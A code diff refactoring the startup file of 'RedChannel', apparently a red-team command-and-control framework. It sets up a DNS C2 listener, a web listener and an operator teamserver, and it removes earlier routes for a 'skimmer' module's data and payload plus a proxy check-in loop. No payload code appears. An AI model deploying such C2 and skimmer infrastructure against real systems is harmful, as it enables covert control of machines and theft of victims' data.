@@ -1,15 +1,14 @@
-import * as dnsd from "dnsd2";
 import { createCommand } from "commander";
-import express from "express";
 import _merge from "lodash.merge";
 
 import RedChannel from "./lib/redchannel";
-import Logger from "./lib/logger";
-import { Config, Constants, BANNER, emsg } from "./utils";
+import Logger, { LogLevel } from "./lib/logger";
+import { Config, Constants, RedChannelBanner, emsg } from "./utils";
 import { DefaultConfig, RedChannelConfig } from "./lib/config";
-import SocketServer from "./server/socket";
+import { TeamServer, WebServer, DnsServer } from "./server";
 
 const log = new Logger();
+log.msg(RedChannelBanner);
 
 const program = createCommand();
 program
@@ -18,17 +17,19 @@ program
     .option("-c, --config <path/to/rc.conf>", "specify a redchannel config file", Config.DEFAULT_CONFIG_FILE)
     .option("-p, --password <password>", "specify the password or set via env:RC_PASSWORD")
     .option("-d, --domain <domain>", "specify the c2 domain")
-    .option("-B, --ip, --dns-ip [ip]", "bind dns c2 to ip")
-    .option("-P, --port, --dns-port [port]", "listen for dns on a specific port")
-    .option("-W, --web-ip [ip]", "bind web server to ip")
-    .option("-Y, --web-port [port]", "listen for web on a specific port")
     .option("-D, --debug", "enable debug", false)
+    .option("--dns-ip [ip]", "bind dns c2 to ip")
+    .option("--dns-port [port]", "listen for dns on a specific port")
+    .option("--web-ip [ip]", "bind web server to ip")
+    .option("--web-port [port]", "listen for web on a specific port")
+    .option("--ts-ip [ip]", "bind teamserver to ip")
+    .option("--ts-port [port]", "listen for teamserver connections on a specific port")
     .parse();
 
 // env password takes priority over commandline
-const cliPassword = (process.env.RC_PASSWORD as string) ?? (program.getOptionValue("password") as string);
-if (!cliPassword) {
-    log.error("! please specify a master c2 password via command-lie or environment variable, see '--help'");
+const password = (process.env.RC_PASSWORD as string) ?? (program.getOptionValue("password") as string);
+if (!password?.length) {
+    log.error("invalid c2 password: please specify a c2 password via command-line or the RC_PASSWORD environment variable, see '--help'");
     process.exit(1);
 }
 
@@ -39,6 +40,8 @@ const cliConfig: RedChannelConfig = _merge(DefaultConfig, {
         dns_port: program.getOptionValue("port"),
         web_ip: program.getOptionValue("webIp"),
         web_port: program.getOptionValue("webPort"),
+        ws_ip: program.getOptionValue("wsIp"),
+        ws_port: program.getOptionValue("wsPort"),
         debug: program.getOptionValue("debug"),
     },
 });
@@ -47,66 +50,37 @@ const cliConfigFilePath = program.getOptionValue("config");
 
 let redchannel: RedChannel;
 try {
-    redchannel = new RedChannel(cliPassword, cliConfigFilePath, cliConfig);
+    redchannel = new RedChannel(password, cliConfigFilePath, cliConfig);
 } catch (ex) {
-    log.error(`! error instantiating redchannel: ${emsg(ex)}`);
+    log.error(`error instantiating redchannel: ${emsg(ex)}`);
     process.exit(1);
 }
 
-log.msg(BANNER);
+if (redchannel.config.c2.debug) {
+    log.warn("debug is enabled");
+    log.level = LogLevel.DEBUG;
+}
 
 process.on("uncaughtException", (ex, origin) => {
     log.error(`process error: ${emsg(ex)}, origin: ${origin}`);
+    log.debug(ex, origin);
 });
-
-/**
- * c2-web listener
- */
-const webServer = express();
-webServer.get(redchannel.config.skimmer.data_route, redchannel.modules.skimmer.dataRouteHandler.bind(redchannel.modules.skimmer));
-webServer.get(redchannel.config.skimmer.payload_route, redchannel.modules.skimmer.payloadRouteHandler.bind(redchannel.modules.skimmer));
 
 const c2Config = redchannel.config.c2;
-webServer.listen(c2Config.web_port, c2Config.web_ip, () => {
-    log.info(`c2-web listening on: ${redchannel.config.c2.web_ip}:${redchannel.config.c2.web_port}`);
+const webServer = new WebServer(redchannel, c2Config.web_port, c2Config.web_ip, log);
+webServer.start(() => {
+    log.info(`c2-web listening on ${webServer.bindIp}:${webServer.port}`);
 });
 
-const socketServerPort = 8443;
-const socketServerBindHost = "0.0.0.0";
-const socketServer = new SocketServer(redchannel, socketServerPort, socketServerBindHost, log);
-socketServer.start(() => {
-    log.info(`socket server listening on ${socketServer.bindHost}:${socketServer.port}`);
+const dnsServer = new DnsServer(redchannel, c2Config.dns_port, c2Config.dns_ip, c2Config.domain, log);
+dnsServer.start(() => {
+    log.info(`c2-dns listening on: ${c2Config.dns_ip}:${c2Config.dns_port}, c2 domain: ${c2Config.domain}`);
 });
 
 /**
- * c2-dns
+ * c2-ts used by operators
  */
-const dnsServer = dnsd.createServer(redchannel.c2MessageHandler.bind(redchannel));
-
-dnsServer.on("error", (ex: Error, msg: Error) => {
-    log.error(`dns server error: ${emsg(ex)}, msg: ${emsg(msg)}`);
+const teamServer = new TeamServer(redchannel, c2Config.ts_port, c2Config.ts_ip, log);
+teamServer.start(() => {
+    log.info(`teamserver listening on ${teamServer.bindIp}:${teamServer.port}`);
 });
-
-// prettier-ignore
-dnsServer
-    .zone(
-        c2Config.domain,
-        'ns1.' + c2Config.domain,
-        'root@' + c2Config.domain,
-        'now',
-        '2h',
-        '30m',
-        '2w',
-        '10m'
-    )
-    .listen(c2Config.dns_port, c2Config.dns_ip);
-
-log.info(`c2-dns listening on: ${c2Config.dns_ip}:${c2Config.dns_port}, c2 domain: ${c2Config.domain}`);
-
-const proxyConfig = redchannel.config.proxy;
-if (proxyConfig.enabled) {
-    log.info(`c2-proxy enabled, checkin at interval: ${proxyConfig.interval}ms`);
-    redchannel.modules.proxy.proxyFetchLoop();
-} else {
-    log.info("c2-proxy is disabled");
-}
